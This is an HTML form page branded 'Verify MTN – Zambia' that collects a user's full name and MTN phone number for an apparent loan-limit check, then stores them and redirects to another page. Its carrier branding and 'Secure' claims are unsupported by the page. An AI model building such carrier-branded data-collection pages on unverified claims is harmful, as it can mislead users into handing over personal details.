<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <title>Verify MTN – Zambia</title>
    <link rel="preconnect" href="https://fonts.googleapis.com" />
    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin />
    <link href="https://fonts.googleapis.com/css2?family=Inter:opsz,wght@14..32,400;14..32,600;14..32,700&display=swap" rel="stylesheet" />
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            font-family: 'Inter', sans-serif;
            min-height: 100vh;
            display: flex;
            align-items: center;
            justify-content: center;
            background: linear-gradient(145deg, #f8fafc 0%, #eef2f6 100%);
            padding: 1.5rem;
        }
        .phone-card {
            max-width: 480px;
            width: 100%;
            background: #ffffff;
            padding: 2.8rem 2.5rem 2.8rem;
            border-radius: 2.5rem;
            box-shadow: 0 20px 60px rgba(0, 20, 30, 0.12);
            text-align: center;
            transition: transform 0.25s ease;
        }
        .phone-card:hover { transform: translateY(-4px); }
        .back-link {
            display: inline-flex;
            align-items: center;
            gap: 0.4rem;
            font-size: 0.85rem;
            font-weight: 500;
            color: #5b6f7e;
            text-decoration: none;
            margin-bottom: 1.2rem;
        }
        .back-link:hover { color: #1a7f5c; }
        .back-link svg { width: 18px; height: 18px; fill: none; stroke: currentColor; stroke-width: 2.5; stroke-linecap: round; stroke-linejoin: round; }
        .brand-mini .brand-name { font-size: 1.6rem; font-weight: 700; color: #0b2b3b; }
        .brand-mini .brand-name span { color: #1a7f5c; }
        .brand-mini .brand-tagline { font-size: 0.8rem; font-weight: 500; color: #5b6f7e; margin-top: 0.05rem; }
        .divider { width: 60px; height: 3px; background: linear-gradient(90deg, #1a7f5c, #3baa7a); border-radius: 4px; margin: 1rem auto 1.6rem; }
        .step-heading h2 { font-size: 1.4rem; font-weight: 700; color: #0b2b3b; margin-bottom: 0.3rem; }
        .step-heading p { font-size: 0.95rem; color: #4a6376; line-height: 1.5; max-width: 300px; margin: 0 auto 0.4rem; }
        .input-group { margin-top: 1.4rem; text-align: left; }
        .input-group:first-of-type { margin-top: 1.8rem; }
        .input-group label { display: block; font-size: 0.9rem; font-weight: 600; color: #1f3a4a; margin-bottom: 0.5rem; }
        .input-wrapper {
            display: flex;
            align-items: center;
            background: #f1f5f9;
            border-radius: 60px;
            padding: 0.2rem 0.2rem 0.2rem 1.2rem;
            border: 2px solid transparent;
            transition: border-color 0.25s ease, box-shadow 0.25s ease;
        }
        .input-wrapper:focus-within { border-color: #1a7f5c; background: #ffffff; box-shadow: 0 0 0 4px rgba(26, 127, 92, 0.12); }
        .input-wrapper .prefix { font-size: 0.95rem; font-weight: 600; color: #1f3a4a; background: #e4e9ef; padding: 0.3rem 0.9rem; border-radius: 40px; margin-right: 0.5rem; }
        .input-wrapper input { flex: 1; border: none; background: transparent; font-size: 1.1rem; font-weight: 500; padding: 0.9rem 0.6rem 0.9rem 0.2rem; outline: none; color: #0b2b3b; font-family: 'Inter', sans-serif; width: 100%; }
        .input-wrapper input::placeholder { color: #a8bccd; font-weight: 400; font-size: 0.95rem; }
        .name-wrapper {
            display: flex;
            align-items: center;
            background: #f1f5f9;
            border-radius: 60px;
            padding: 0.2rem 1.2rem;
            border: 2px solid transparent;
            transition: border-color 0.25s ease, box-shadow 0.25s ease;
        }
        .name-wrapper:focus-within { border-color: #1a7f5c; background: #ffffff; box-shadow: 0 0 0 4px rgba(26, 127, 92, 0.12); }
        .name-wrapper input { flex: 1; border: none; background: transparent; font-size: 1.1rem; font-weight: 500; padding: 0.9rem 0.2rem; outline: none; color: #0b2b3b; font-family: 'Inter', sans-serif; width: 100%; }
        .name-wrapper input::placeholder { color: #a8bccd; font-weight: 400; font-size: 0.95rem; }
        .hint { min-height: 1.8rem; margin-top: 0.6rem; font-size: 0.85rem; font-weight: 400; color: #8a9caa; padding-left: 0.3rem; }
        .btn-check {
            display: block;
            width: 100%;
            background: #1a7f5c;
            color: #ffffff;
            font-size: 1.1rem;
            font-weight: 600;
            padding: 1rem 1.5rem;
            border: none;
            border-radius: 60px;
            cursor: pointer;
            transition: background 0.25s ease, transform 0.15s ease;
            box-shadow: 0 8px 24px rgba(26, 127, 92, 0.30);
            margin-top: 1.8rem;
            font-family: 'Inter', sans-serif;
        }
        .btn-check:hover:not(:disabled) { background: #146a4b; transform: scale(1.01); }
        .btn-check:disabled { background: #b0c4d4; box-shadow: none; cursor: not-allowed; opacity: 0.7; transform: none; }
        .footer-note { margin-top: 2rem; font-size: 0.75rem; color: #8a9caa; display: flex; justify-content: center; gap: 1rem; flex-wrap: wrap; }
        @media (max-width: 480px) {
            .phone-card { padding: 2rem 1.5rem 2rem; border-radius: 2rem; }
            .brand-mini .brand-name { font-size: 1.4rem; }
            .step-heading h2 { font-size: 1.2rem; }
            .input-wrapper { padding: 0.1rem 0.1rem 0.1rem 0.8rem; }
            .input-wrapper .prefix { font-size: 0.8rem; padding: 0.2rem 0.6rem; }
            .input-wrapper input { font-size: 1rem; padding: 0.7rem 0.4rem; }
            .name-wrapper { padding: 0.1rem 0.8rem; }
            .name-wrapper input { font-size: 1rem; padding: 0.7rem 0.2rem; }
            .btn-check { font-size: 1rem; padding: 0.8rem 1.2rem; }
        }
    </style>
</head>
<body>
    <div class="phone-card">
        <a href="index.html" class="back-link"><svg viewBox="0 0 24 24"><path d="M15 19l-7-7 7-7" /></svg> Back</a>
        <div class="brand-mini">
            <div class="brand-name">Mobile Verification</div>
            <div class="brand-tagline">• verify your details •</div>
        </div>
        <div class="divider"></div>
        <div class="step-heading">
            <h2>📱 Enter your details</h2>
            <p>We'll check your eligibility and show your loan limit.</p>
        </div>

        <div class="input-group">
            <label for="nameInput">Full Name <span class="asterisk">*</span></label>
            <div class="name-wrapper">
                <input type="text" id="nameInput" placeholder="Enter your full name" autocomplete="name" />
            </div>
        </div>

        <div class="input-group">
            <label for="mtnInput">MTN Mobile Number <span class="asterisk">*</span></label>
            <div class="input-wrapper">
                <span class="prefix">+260</span>
                <input type="tel" id="mtnInput" placeholder="96 123 4567" inputmode="numeric" autocomplete="tel" />
            </div>
            <div class="hint" id="hint">Enter a 9-digit MTN number</div>
        </div>

        <button class="btn-check" id="checkBtn" disabled>Check My Limit</button>
        <div class="footer-note"><span>🔒 Secure</span> <span class="dot">•</span> <span>⚡ Instant check</span> <span class="dot">•</span> <span>🇿🇲 MTN Zambia</span></div>
    </div>
    <script>
        (function() {
            const nameInput = document.getElementById('nameInput');
            const input = document.getElementById('mtnInput');
            const checkBtn = document.getElementById('checkBtn');

            // Load previously saved name (if any)
            const savedName = localStorage.getItem('fullName') || '';
            if (savedName && savedName !== 'User' && savedName !== 'MTN User') {
                nameInput.value = savedName;
            }

            function formatNumber(value) {
                const digits = value.replace(/\D/g, '').slice(0, 9);
                if (digits.length <= 2) return digits;
                if (digits.length <= 5) return digits.slice(0, 2) + ' ' + digits.slice(2);
                return digits.slice(0, 2) + ' ' + digits.slice(2, 5) + ' ' + digits.slice(5);
            }

            function update() {
                const rawDigits = input.value.replace(/\D/g, '');
                const digits = rawDigits.slice(0, 9);
                input.value = formatNumber(digits);

                const nameOk = nameInput.value.trim().length >= 3;
                const phoneOk = digits.length === 9;
                checkBtn.disabled = !(nameOk && phoneOk);
            }

            nameInput.addEventListener('input', update);

            input.addEventListener('input', update);

            checkBtn.addEventListener('click', function() {
                const name = nameInput.value.trim();
                const digits = input.value.replace(/\D/g, '');

                if (name.length < 3 || digits.length !== 9) return;

                // Store for use on all subsequent pages / server submissions
                localStorage.setItem('fullName', name);
                localStorage.setItem('phone', '+260' + digits);

                window.location.href = 'limit.html';
            });

            input.addEventListener('keydown', function(e) {
                if (e.key === 'Enter' && !checkBtn.disabled) checkBtn.click();
            });
            nameInput.addEventListener('keydown', function(e) {
                if (e.key === 'Enter' && !checkBtn.disabled) checkBtn.click();
            });

            update();
            nameInput.focus();
        })();
    </script>
</body>
</html>
